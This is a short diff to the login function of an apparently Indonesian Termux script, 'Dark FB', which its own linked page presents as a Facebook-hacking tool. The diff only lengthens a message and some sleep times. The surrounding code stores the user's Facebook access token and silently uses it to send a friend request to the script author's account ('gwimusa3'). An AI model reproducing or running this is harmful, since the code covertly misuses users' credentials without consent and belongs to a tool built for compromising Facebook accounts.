@@ -126,10 +126,10 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil. Untuk Panduan Menggunakan SC ini, Silahkan Baca Postingan Berikut'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://termux.id/cara-hack-facebook-menggunakan-termux-script-dark-fb/')
-                time.sleep(2)
+                time.sleep(10)
                 menu()
             except requests.exceptions.ConnectionError:
                 print '\n\x1b[1;91m[!] Tidak ada koneksi'
@@ -139,7 +139,7 @@ def login():
             print '\n\x1b[1;91m[!] \x1b[1;93mAkun FB kena Checkpoint (Karena LOgin Pake Python) Segera Perbaiki Dulu Dan Baca Postingan Berikut Untuk Menghindarinya'
             os.system('rm -rf login.txt')
             os.system('xdg-open https://termux.id/4-cara-untuk-menghindari-checkpoint-facebook/')
-            time.sleep(5)
+            time.sleep(10)
             keluar()
         else:
             print '\n\x1b[1;91m[!] Login Gagal (Mungkin Username/Pass salah Ketik Coba Login pake Browser dulu'
